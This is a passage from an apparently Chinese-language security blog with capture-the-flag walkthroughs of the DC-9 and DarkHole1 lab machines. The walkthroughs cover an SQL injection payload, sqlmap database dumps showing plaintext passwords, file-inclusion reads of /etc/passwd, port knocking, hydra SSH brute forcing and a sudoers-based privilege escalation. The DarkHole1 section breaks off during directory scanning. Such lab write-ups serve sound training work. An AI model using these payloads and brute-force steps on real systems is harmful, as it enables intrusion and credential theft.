responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 192.168.43.104</li>
<li>NMAP</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.104</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# nmap -sV -A -p 1-65535 192.168.43.104</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-03 08:42 EST</span><br><span class="line">Nmap scan report for 192.168.43.104</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE    SERVICE VERSION                                                                                                                                                                                   </span><br><span class="line">22/tcp filtered ssh                                                                                                                                                                                               </span><br><span class="line">80/tcp open     http    Apache httpd 2.4.38 ((Debian))                                                                                                                                                            </span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)                                                                                                                                                                      </span><br><span class="line">|_http-title: Example.com - Staff Details - Welcome                                                                                                                                                               </span><br><span class="line">MAC Address: 08:00:27:DC:99:C4 (Oracle VirtualBox virtual NIC)                                                                                                                                                    </span><br><span class="line">Device type: general purpose                                                                                                                                                                                      </span><br><span class="line">Running: Linux 3.X|4.X                                                                                                                                                                                            </span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4                                                                                                                                                   </span><br><span class="line">OS details: Linux 3.2 - 4.9                                                                                                                                                                                       </span><br><span class="line">Network Distance: 1 hop                                                                                                                                                                                           </span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.37 ms 192.168.43.104</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 15.77 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./DC-9/2.png" alt></p>
<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><p><img data-src="./DC-9/3.png" alt></p>
<h3 id="发现SQL注入"><a href="#发现SQL注入" class="headerlink" title="发现SQL注入"></a>发现SQL注入</h3><p><img data-src="./DC-9/4.png" alt></p>
<p><img data-src="./DC-9/5.png" alt></p>
<ul>
<li><code>SQLMAP</code> 一把梭</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /results.php HTTP/1.1</span><br><span class="line">Host: 192.168.43.104</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 32</span><br><span class="line">Origin: http://192.168.43.104</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.43.104/search.php</span><br><span class="line">Cookie: PHPSESSID=cuetmtotc92rn6jqtqgckcvat6</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">search=Moe%25%27+or+1%3D1+--+qwe</span><br><span class="line"></span><br><span class="line">python sqlmap.py -r 3.txt --level 3 --risk 3</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[08:52:33] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval</span><br><span class="line">POST parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N]</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 153 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: search (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: search=-1171' OR 4129=4129-- wcdf</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (random number) - 6 columns</span><br><span class="line">    Payload: search=-1863' UNION ALL SELECT CONCAT(0x717a627871,0x5251564472476e5654434e48697a617a54586a7a57624f524f6d4548767a516873456a5866414b55,0x7162626271),2039,2039,2039,2039,2039-- -</span><br><span class="line">---</span><br><span class="line">[08:52:40] [INFO] testing MySQL</span><br><span class="line">[08:52:40] [INFO] confirming MySQL</span><br><span class="line">[08:52:40] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Debian 10 (buster)</span><br><span class="line">web application technology: Apache 2.4.38</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.0 (MariaDB fork)</span><br><span class="line">[08:52:40] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.43.104'</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python sqlmap.py -r 3.txt --level 3 --risk 3 --dbs</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[*] information_schema</span><br><span class="line">[*] Staff</span><br><span class="line">[*] users</span><br><span class="line"></span><br><span class="line">python sqlmap.py -r 3.txt --level 3 --risk 3 -D Staff --dump</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line"></span><br><span class="line">Database: Staff</span><br><span class="line">Table: StaffDetails</span><br><span class="line">[17 entries]</span><br><span class="line">+----+----------------+-----------------------+---------------------+------------+-----------+-------------------------------+</span><br><span class="line">| id | phone          | email                 | reg_date            | lastname   | firstname | position                      |</span><br><span class="line">+----+----------------+-----------------------+---------------------+------------+-----------+-------------------------------+</span><br><span class="line">| 1  | 46478415155456 | marym@example.com     | 2019-05-01 17:32:00 | Moe        | Mary      | CEO                           |</span><br><span class="line">| 2  | 46457131654    | julied@example.com    | 2019-05-01 17:32:00 | Dooley     | Julie     | Human Resources               |</span><br><span class="line">| 3  | 46415323       | fredf@example.com     | 2019-05-01 17:32:00 | Flintstone | Fred      | Systems Administrator         |</span><br><span class="line">| 4  | 324643564      | barneyr@example.com   | 2019-05-01 17:32:00 | Rubble     | Barney    | Help Desk                     |</span><br><span class="line">| 5  | 802438797      | tomc@example.com      | 2019-05-01 17:32:00 | Cat        | Tom       | Driver                        |</span><br><span class="line">| 6  | 24342654756    | jerrym@example.com    | 2019-05-01 17:32:00 | Mouse      | Jerry     | Stores                        |</span><br><span class="line">| 7  | 243457487      | wilmaf@example.com    | 2019-05-01 17:32:00 | Flintstone | Wilma     | Accounts                      |</span><br><span class="line">| 8  | 90239724378    | bettyr@example.com    | 2019-05-01 17:32:00 | Rubble     | Betty     | Junior Accounts               |</span><br><span class="line">| 9  | 189024789      | chandlerb@example.com | 2019-05-01 17:32:00 | Bing       | Chandler  | President - Sales             |</span><br><span class="line">| 10 | 232131654      | joeyt@example.com     | 2019-05-01 17:32:00 | Tribbiani  | Joey      | Janitor                       |</span><br><span class="line">| 11 | 823897243978   | rachelg@example.com   | 2019-05-01 17:32:00 | Green      | Rachel    | Personal Assistant            |</span><br><span class="line">| 12 | 6549638203     | rossg@example.com     | 2019-05-01 17:32:00 | Geller     | Ross      | Instructor                    |</span><br><span class="line">| 13 | 8092432798     | monicag@example.com   | 2019-05-01 17:32:00 | Geller     | Monica    | Marketing                     |</span><br><span class="line">| 14 | 43289079824    | phoebeb@example.com   | 2019-05-01 17:32:02 | Buffay     | Phoebe    | Assistant Janitor             |</span><br><span class="line">| 15 | 454786464      | scoots@example.com    | 2019-05-01 20:16:33 | McScoots   | Scooter   | Resident Cat                  |</span><br><span class="line">| 16 | 65464646479741 | janitor@example.com   | 2019-12-23 03:11:39 | Trump      | Donald    | Replacement Janitor           |</span><br><span class="line">| 17 | 47836546413    | janitor2@example.com  | 2019-12-24 03:41:04 | Morrison   | Scott     | Assistant Replacement Janitor |</span><br><span class="line">+----+----------------+-----------------------+---------------------+------------+-----------+-------------------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: Staff</span><br><span class="line">Table: Users</span><br><span class="line">[1 entry]</span><br><span class="line">+--------+----------+----------------------------------+</span><br><span class="line">| UserID | Username | Password                         |</span><br><span class="line">+--------+----------+----------------------------------+</span><br><span class="line">| 1      | admin    | 856f5de590ef37314e7c3bdf6f8a66dc |</span><br><span class="line">+--------+----------+----------------------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python sqlmap.py -r 3.txt --level 3 --risk 3 -D users --dump</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line"></span><br><span class="line">Database: users</span><br><span class="line">Table: UserDetails</span><br><span class="line">[17 entries]</span><br><span class="line">+----+-----------+------------+---------------------+---------------+-----------+</span><br><span class="line">| id | username  | lastname   | reg_date            | password      | firstname |</span><br><span class="line">+----+-----------+------------+---------------------+---------------+-----------+</span><br><span class="line">| 1  | marym     | Moe        | 2019-12-29 16:58:26 | 3kfs86sfd     | Mary      |</span><br><span class="line">| 2  | julied    | Dooley     | 2019-12-29 16:58:26 | 468sfdfsd2    | Julie     |</span><br><span class="line">| 3  | fredf     | Flintstone | 2019-12-29 16:58:26 | 4sfd87sfd1    | Fred      |</span><br><span class="line">| 4  | barneyr   | Rubble     | 2019-12-29 16:58:26 | RocksOff      | Barney    |</span><br><span class="line">| 5  | tomc      | Cat        | 2019-12-29 16:58:26 | TC&amp;TheBoyz    | Tom       |</span><br><span class="line">| 6  | jerrym    | Mouse      | 2019-12-29 16:58:26 | B8m#48sd      | Jerry     |</span><br><span class="line">| 7  | wilmaf    | Flintstone | 2019-12-29 16:58:26 | Pebbles       | Wilma     |</span><br><span class="line">| 8  | bettyr    | Rubble     | 2019-12-29 16:58:26 | BamBam01      | Betty     |</span><br><span class="line">| 9  | chandlerb | Bing       | 2019-12-29 16:58:26 | UrAG0D!       | Chandler  |</span><br><span class="line">| 10 | joeyt     | Tribbiani  | 2019-12-29 16:58:26 | Passw0rd      | Joey      |</span><br><span class="line">| 11 | rachelg   | Green      | 2019-12-29 16:58:26 | yN72#dsd      | Rachel    |</span><br><span class="line">| 12 | rossg     | Geller     | 2019-12-29 16:58:26 | ILoveRachel   | Ross      |</span><br><span class="line">| 13 | monicag   | Geller     | 2019-12-29 16:58:26 | 3248dsds7s    | Monica    |</span><br><span class="line">| 14 | phoebeb   | Buffay     | 2019-12-29 16:58:26 | smellycats    | Phoebe    |</span><br><span class="line">| 15 | scoots    | McScoots   | 2019-12-29 16:58:26 | YR3BVxxxw87   | Scooter   |</span><br><span class="line">| 16 | janitor   | Trump      | 2019-12-29 16:58:26 | Ilovepeepee   | Donald    |</span><br><span class="line">| 17 | janitor2  | Morrison   | 2019-12-29 16:58:28 | Hawaii-Five-0 | Scott     |</span><br><span class="line">+----+-----------+------------+---------------------+---------------+-----------+</span><br></pre></td></tr></table></figure>

<ul>
<li>解密得到账户密码 <code>admin / transorbital1</code></li>
</ul>
<p><img data-src="./DC-9/6.png" alt></p>
<h3 id="admin登入前台"><a href="#admin登入前台" class="headerlink" title="admin登入前台"></a>admin登入前台</h3><p><img data-src="./DC-9/7.png" alt></p>
<p><img data-src="./DC-9/8.png" alt></p>
<p>提示 <code>File does not exist</code>,怀疑存在文件包含问题</p>
<p><img data-src="./DC-9/9.png" alt></p>
<p>存在的账户</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">marym:x:1001:1001:Mary Moe:/home/marym:/bin/bash</span><br><span class="line">julied:x:1002:1002:Julie Dooley:/home/julied:/bin/bash</span><br><span class="line">fredf:x:1003:1003:Fred Flintstone:/home/fredf:/bin/bash</span><br><span class="line">barneyr:x:1004:1004:Barney Rubble:/home/barneyr:/bin/bash</span><br><span class="line">tomc:x:1005:1005:Tom Cat:/home/tomc:/bin/bash</span><br><span class="line">jerrym:x:1006:1006:Jerry Mouse:/home/jerrym:/bin/bash</span><br><span class="line">wilmaf:x:1007:1007:Wilma Flintstone:/home/wilmaf:/bin/bash</span><br><span class="line">bettyr:x:1008:1008:Betty Rubble:/home/bettyr:/bin/bash</span><br><span class="line">chandlerb:x:1009:1009:Chandler Bing:/home/chandlerb:/bin/bash</span><br><span class="line">joeyt:x:1010:1010:Joey Tribbiani:/home/joeyt:/bin/bash</span><br><span class="line">rachelg:x:1011:1011:Rachel Green:/home/rachelg:/bin/bash</span><br><span class="line">rossg:x:1012:1012:Ross Geller:/home/rossg:/bin/bash</span><br><span class="line">monicag:x:1013:1013:Monica Geller:/home/monicag:/bin/bash</span><br><span class="line">phoebeb:x:1014:1014:Phoebe Buffay:/home/phoebeb:/bin/bash</span><br><span class="line">scoots:x:1015:1015:Scooter McScoots:/home/scoots:/bin/bash</span><br><span class="line">janitor:x:1016:1016:Donald Trump:/home/janitor:/bin/bash</span><br><span class="line">janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bash</span><br></pre></td></tr></table></figure>

<ul>
<li><code>PS</code>可以通过<code>/proc/sched_debug</code>文件查看当前系统进行运行情况</li>
</ul>
<p><img data-src="./DC-9/10.png" alt></p>
<p>发现存在 <code>knockd</code>守护进程</p>
<p>查看<code>knockd</code>配置文件 <code>/etc/knockd.conf</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[openSSH]</span><br><span class="line">	sequence    = 7469,8475,9842</span><br><span class="line">	seq_timeout = 25</span><br><span class="line">	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT</span><br><span class="line">	tcpflags    = syn</span><br><span class="line"></span><br><span class="line">[closeSSH]</span><br><span class="line">	sequence    = 9842,8475,7469</span><br><span class="line">	seq_timeout = 25</span><br><span class="line">	command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT</span><br><span class="line">	tcpflags    = syn</span><br></pre></td></tr></table></figure>

<ul>
<li>敲击方法</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for x in 7469 8475 9842;do nmap ‐Pn ‐‐max‐retries 0 ‐p $x 192.168.43.104;done </span><br><span class="line">for x in 7469 8475 9842 22 ;do nc 192.168.43.104 $x;done</span><br></pre></td></tr></table></figure>

<h3 id="hydra尝试爆破ssh"><a href="#hydra尝试爆破ssh" class="headerlink" title="hydra尝试爆破ssh"></a>hydra尝试爆破ssh</h3><ul>
<li><code>user_dict</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">root</span><br><span class="line">marym</span><br><span class="line">julied</span><br><span class="line">fredf</span><br><span class="line">barneyr</span><br><span class="line">tomc</span><br><span class="line">jerrym</span><br><span class="line">wilmaf</span><br><span class="line">bettyr</span><br><span class="line">chandlerb</span><br><span class="line">joeyt</span><br><span class="line">rachelg</span><br><span class="line">rossg</span><br><span class="line">monicag</span><br><span class="line">phoebeb</span><br><span class="line">scoots</span><br><span class="line">janitor</span><br><span class="line">janitor2</span><br></pre></td></tr></table></figure>

<ul>
<li><code>pass_dict</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">3kfs86sfd</span><br><span class="line">468sfdfsd2</span><br><span class="line">4sfd87sfd1</span><br><span class="line">RocksOff</span><br><span class="line">TC&amp;TheBoyz</span><br><span class="line"><span class="meta">B8m#</span><span class="bash">48sd</span></span><br><span class="line">Pebbles</span><br><span class="line">BamBam01</span><br><span class="line">UrAG0D!</span><br><span class="line">Passw0rd</span><br><span class="line"><span class="meta">yN72#</span><span class="bash">dsd</span></span><br><span class="line">ILoveRachel</span><br><span class="line">3248dsds7s</span><br><span class="line">smellycats</span><br><span class="line">YR3BVxxxw87</span><br><span class="line">Ilovepeepee</span><br><span class="line">Hawaii-Five-0</span><br><span class="line">transorbital1</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -L ./user_dict.txt -P ./pass_dict.txt -t 6 ssh://192.168.43.104</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/work/dc-9# hydra -L ./user_dict.txt -P ./pass_dict.txt -t 6 ssh://192.168.43.104</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-03 09:41:11</span><br><span class="line">[DATA] max 6 tasks per 1 server, overall 6 tasks, 342 login tries (l:19/p:18), ~57 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.43.104:22/</span><br><span class="line">[STATUS] 121.00 tries/min, 121 tries in 00:01h, 221 to do in 00:02h, 6 active</span><br><span class="line">[22][ssh] host: 192.168.43.104   login: chandlerb   password: UrAG0D!</span><br><span class="line">[22][ssh] host: 192.168.43.104   login: joeyt   password: Passw0rd</span><br><span class="line">[STATUS] 126.00 tries/min, 252 tries in 00:02h, 90 to do in 00:01h, 6 active</span><br><span class="line">[22][ssh] host: 192.168.43.104   login: janitor   password: Ilovepeepee</span><br><span class="line">1 of 1 target successfully completed, 3 valid passwords found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-03 09:44:05</span><br></pre></td></tr></table></figure>

<ul>
<li>登录 <code>janitor / Ilovepeepee</code></li>
</ul>
<p><img data-src="./DC-9/11.png" alt></p>
<ul>
<li>发现密码文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line"><span class="meta">P0Lic#</span><span class="bash">10-4</span></span><br><span class="line">B4-Tru3-001</span><br><span class="line">4uGU5T-NiGHts</span><br></pre></td></tr></table></figure>

<ul>
<li>用户不变，新密码本继续爆破</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/caixin/work/dc-9# hydra -L ./user_dict.txt -P ./pass_dict_new.txt -t 6 ssh://192.168.43.104</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-03 09:53:31</span><br><span class="line">[DATA] max 6 tasks per 1 server, overall 6 tasks, 114 login tries (l:19/p:6), ~19 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.43.104:22/</span><br><span class="line">[22][ssh] host: 192.168.43.104   login: fredf   password: B4-Tru3-001</span><br><span class="line">[22][ssh] host: 192.168.43.104   login: joeyt   password: Passw0rd</span><br><span class="line">1 of 1 target successfully completed, 2 valid passwords found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-03 09:54:26</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ul>
<li>切换到<code>fredf</code></li>
</ul>
<p><img data-src="./DC-9/12.png" alt></p>
<p><img data-src="./DC-9/13.png" alt></p>
<ul>
<li><p>发现可以写入文件</p>
</li>
<li><p>写入<code>sudo</code>文件</p>
</li>
</ul>
<p><img data-src="./DC-9/14.png" alt></p>
<p><img data-src="./DC-9/15.png" alt></p>
<ul>
<li>登录<code>joeyt</code></li>
</ul>
<p><img data-src="./DC-9/16.png" alt></p>
<p><img data-src="./DC-9/17.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>DC</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>DarkHole1</title>
    <url>/2021/09/09/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/DarkHole1/</url>
    <content><![CDATA[<h1 id="DarkHole1"><a href="#DarkHole1" class="headerlink" title="DarkHole1"></a>DarkHole1</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>DarkHole1</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\DarkHole1&gt; arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:47:5c:20, IPv4: 192.168.1.102</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d8:c8:e9:fe:be:88       Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.2     20:41:10:1a:04:8c       (Unknown)</span><br><span class="line">192.168.1.3     00:11:32:73:68:3b       Synology Incorporated</span><br><span class="line">192.168.1.4     00:0c:29:5a:87:06       VMware, Inc.</span><br><span class="line">192.168.1.5     00:0c:29:76:5e:9f       VMware, Inc.</span><br><span class="line">192.168.1.109   40:31:3c:22:9c:f3       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.137   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.152   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.228   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.242   3c:7c:3f:d3:05:d5       (Unknown)</span><br><span class="line"></span><br><span class="line">10 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.968 seconds (130.08 hosts/sec). 10 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.152</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.120</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\home\workhard\vulnhub\DarkHole&gt; nmap -sV -A -p 1-65535 192.168.1.120</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 19:12 EDT</span><br><span class="line">Nmap scan report for darkhole.lan (192.168.1.120)</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 e4:50:d9:50:5d:91:30:50:e9:b5:7d:ca:b0:51:db:74 (RSA)</span><br><span class="line">|   256 73:0c:76:86:60:63:06:00:21:c2:36:20:3b:99:c1:f7 (ECDSA)</span><br><span class="line">|_  256 54:53:4c:3f:4f:3a:26:f6:02:aa:9a:24:ea:1b:92:8c (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: DarkHole</span><br><span class="line">MAC Address: 44:1C:A8:7F:6D:F4 (Hon Hai Precision Ind.)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.91%E=4%D=9/9%OT=22%CT=1%CU=38469%PV=Y%DS=1%DC=D%G=Y%M=441CA8%TM</span><br><span class="line">OS:=613A94E6%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=2%ISR=110%TI=Z%II=I%TS=A)S</span><br><span class="line">OS:EQ(SP=FE%GCD=1%ISR=110%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST1</span><br><span class="line">OS:1NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE</span><br><span class="line">OS:88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5</span><br><span class="line">OS:B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4</span><br><span class="line">OS:(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T=40%W=0%S=</span><br><span class="line">OS:Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q</span><br><span class="line">OS:=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%</span><br><span class="line">OS:IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.19 ms darkhole.lan (192.168.1.120)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 23.71 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.120/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\home\workhard&gt; gobuster dir -u http://192.168.1.120/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php                                                                        1 ⨯</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.120/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              txt,php,html</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/09/09 19:12:21 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/login.php            (Status: 200) 